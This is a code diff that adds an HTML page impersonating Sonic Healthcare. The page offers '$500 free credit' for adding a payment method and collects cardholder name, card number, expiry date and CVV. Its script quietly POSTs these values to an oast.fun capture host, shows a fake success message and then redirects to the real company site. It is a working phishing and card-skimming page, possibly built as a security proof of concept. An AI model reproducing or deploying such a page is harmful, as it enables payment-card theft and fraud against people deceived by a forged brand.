@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Payment Method</title>
+    <link rel="icon" href="https://www.sonichealthcareusa.com/favicon/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            padding-top: 50px;
+        }
+        .payment-container {
+            text-align: center;
+        }
+        .payment-box {
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 350px;
+            margin-top: 20px;
+        }
+        .payment-box input[type="text"],
+        .payment-box input[type="password"],
+        .payment-box input[type="number"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .payment-box input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #11316e;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .payment-box input[type="submit"]:hover {
+            background-color: #0d2652;
+        }
+        .payment-image {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-container">
+        <img class="payment-image" src="https://remote.sonichealthcare.com/public/share/css/facade3.jpg" alt="Payment Image">
+        <div class="payment-box">
+            <h1>Add Payment Method</h1>
+            <p>Add payment method to get $500 free credit on our premium service.</p>
+            <form id="paymentForm">
+                <input type="text" placeholder="Cardholder Name" id="cardholder" name="cardholder">
+                <input type="text" placeholder="Card Number" id="cardnumber" name="cardnumber">
+                <input type="text" placeholder="Expiration Date (MM/YY)" id="expdate" name="expdate">
+                <input type="password" placeholder="CVV" id="cvv" name="cvv">
+                <input type="submit" value="Add Payment">
+            </form>
+        </div>
+        <div class="footer">
+            © 2024 Sonic Healthcare Limited
+        </div>
+    </div>
+    <script>
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var cardholder = document.getElementById('cardholder').value;
+            var cardnumber = document.getElementById('cardnumber').value;
+            var expdate = document.getElementById('expdate').value;
+            var cvv = document.getElementById('cvv').value;
+
+            fetch('https://jksuolqicsmqvwaztvtw16cqryiysowt1.oast.fun', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cardholder: cardholder, cardnumber: cardnumber, expdate: expdate, cvv: cvv })
+            })
+            .then(response => {
+                var successMessage = document.createElement('p');
+                successMessage.style.color = 'green';
+                successMessage.innerText = "Succeed, Now you can spend $500 credit on Premium service of SonichealthcareUSA within few minutes.";
+                document.querySelector('.payment-box').appendChild(successMessage);
+
+                setTimeout(() => {
+                    window.location.href = 'https://www.sonichealthcare.com/sustainability/';
+                }, 2000);
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+</body>
+</html>
